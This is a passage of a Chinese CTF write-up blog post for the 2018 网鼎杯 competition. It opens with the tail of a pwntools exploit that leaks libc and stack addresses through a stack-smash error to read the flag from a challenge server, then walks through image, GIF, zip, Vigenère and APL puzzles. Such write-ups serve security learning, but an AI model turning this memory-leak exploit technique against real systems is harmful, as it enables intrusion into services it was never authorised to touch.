class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./guess'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">buf = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0 = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">offset1 = argv_0 - gets</span><br><span class="line">offset2 = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>] <span class="comment"># 0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * offset1 + p64(stack - offset2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>取出 Alpha0 和 Green0 通道的图片后异或得到 flag。</p>
<p><img src="/pics/2018-网鼎杯/minified/1.PNG" alt="Alpha0"></p>
<p><img src="/pics/2018-网鼎杯/minified/2.PNG" alt="Green0"></p>
<p><img src="/pics/2018-网鼎杯/minified/3.PNG" alt="flag"></p>
<h2 id="双色块"><a href="#双色块" class="headerlink" title="双色块"></a>双色块</h2><p>先上 binwalk 得到图片，key 为 ctfer2333。</p>
<p>尝试把 gif 每一个帧拼凑成图片，发现无法得到一个正常的二维码。</p>
<p>再猜测将紫色与绿色色块分别表示 1 和 0，先提取出每张图片：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(gif_file)</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    img = Image.open(gif_file)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            current = img.tell()</span><br><span class="line">            <span class="keyword">print</span> current</span><br><span class="line">            img.save(png_dir + str(current + <span class="number">1</span>) + <span class="string">'.png'</span>)</span><br><span class="line">            img.seek(current + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gif_file = <span class="string">'out.gif'</span></span><br><span class="line">    main(gif_file)</span><br></pre></td></tr></table></figure>
<p>再读取图片内容，转换成 0 和 1，最后每 8 位转为一个 ascii 字符：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">        line = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">            file_name = <span class="string">'frame/'</span> + str(i * <span class="number">24</span> + j + <span class="number">1</span>) + <span class="string">'.png'</span></span><br><span class="line">            x = j * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            y = i * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            img = Image.open(file_name)</span><br><span class="line">            img = img.convert(<span class="string">'RGB'</span>)</span><br><span class="line">            img_array = img.load()</span><br><span class="line">            r, g, b = p = img_array[x, y]</span><br><span class="line">            <span class="keyword">if</span> g == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'0'</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">8</span>:</span><br><span class="line">                ret += chr(int(line, <span class="number">2</span>))</span><br><span class="line">                line = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>去掉得到的字符串后面的 hhhhh，因为明显不像加密后的内容， 尝试 base64 无果后，用 DES 解密，密钥即为一开始得到的 ctfer2333，得到 flag。</p>
<h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>解压后用 cat 把所有的文件合并，得到一个 zip 文件，爆破密码得到 flag。</p>
<p><img src="/pics/2018-网鼎杯/welcome/1.png" alt="爆破结果"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>维吉尼亚解密，<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">在线解密</a>，直接得到 flag。</p>
<p><img src="/pics/2018-网鼎杯/shanghai/1.png" alt="flag"></p>
<p>同时还得到密钥是 icqvigenere。</p>
<h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>之前 PladCTF 有<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">一道类似的题目</a>，在 xman 的时候也分析过。</p>
<p>apl 最大的特点是从右往左计算。<code>⍵</code>代表右侧的变量，<code>α</code>代表左侧的变量。</p>
<p>一开始给了一长串 base64 字符串，解密后得到 apl：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos;</span><br></pre></td></tr></table></figure>
<p>先分成几个部分：</p>
<ol>
<li><code>{⍵(~⍵)/(&#39;No_Please_continue&#39;)(&#39;Yes,This_is_flag&#39;)}</code> ==&gt; 输出判断结果</li>
<li><code>(∊(41(41)0+140)(⎕UCS(&#39;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&#39;))146)</code> ==&gt; <code>181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146</code></li>
<li><code>{+/⍺≠33+2⊥(1(5)×8)⍴∊{a≠8↑(1,a←(8⍴2)⊤⍵)}¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)}</code> ==&gt; 主要加密过程</li>
</ol>
<p>再通过主要加密过程分析，根据 apl 的特性应该倒着来：</p>
<ol>
<li><code>(1+(|¯8)⍴1)⊤⎕UCS(⍵)</code> ==&gt; 将 ascii 转换成二进制</li>
<li><code>(∊4(⍴⍴88888)+16)</code> ==&gt; 20 16，即将右侧的矩阵填充为 20*16</li>
<li><code>10⊖⊖⌽</code> ==&gt; 将矩阵的行倒序，列向上  位移 10</li>
<li><code>8(⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;)</code> ==&gt; 8 40，即将右侧的矩阵填充为 8*40</li>
<li><code>2⊥</code> ==&gt; 将二进制转换成 ascii</li>
<li><code>{a≠8↑(1,a←(8⍴2)⊤⍵)}</code> ==&gt; x ^ (x &gt;&gt; 1)</li>
<li><code>+/⍺≠33+2⊥(1(5)×8)</code> ==&gt; <code>¨</code>按列读取矩阵，然后经过上一步的移位异或，转为 ascii 码并加上 33</li>
</ol>
<p>接下来按步骤逆向即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38))</span><br></pre></td></tr></table></figure>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://www.anquanke.com/post/id/158386#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158386#h3-5</a><br><a href="https://xz.aliyun.com/t/2665" target="_blank" rel="noopener">https://xz.aliyun.com/t/2665</a><br><a href="https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w</a><br><a href="https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/" target="_blank" rel="noopener">https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/</a><br><a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism</a><br><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/81950438" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/81950438</a><br><a href="https://xz.aliyun.com/t/2614" target="_blank" rel="noopener">https://xz.aliyun.com/t/2614</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/82217266" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/82217266</a><br><a href="https://xz.aliyun.com/t/2666" target="_blank" rel="noopener">https://xz.aliyun.com/t/2666</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/10/16/2018-护网杯/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2018-护网杯
        
      </div>
    </a>
  
  
    <a href="/2018/09/10/2018-noxCTF/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2018-noxCTF</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">1.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#beijing"><span class="nav-number">1.1.</span> <span class="nav-text">beijing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#advanced"><span class="nav-number">1.2.</span> <span class="nav-text">advanced</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blend"><span class="nav-number">1.3.</span> <span class="nav-text">blend</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUESS"><span class="nav-number">2.1.</span> <span class="nav-text">GUESS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#minified"><span class="nav-number">3.1.</span> <span class="nav-text">minified</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双色块"><span class="nav-number">3.2.</span> <span class="nav-text">双色块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welcome"><span class="nav-number">3.3.</span> <span class="nav-text">welcome</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shanghai"><span class="nav-number">4.1.</span> <span class="nav-text">shanghai</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apl"><span class="nav-number">4.2.</span> <span class="nav-text">apl</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">5.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2020 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
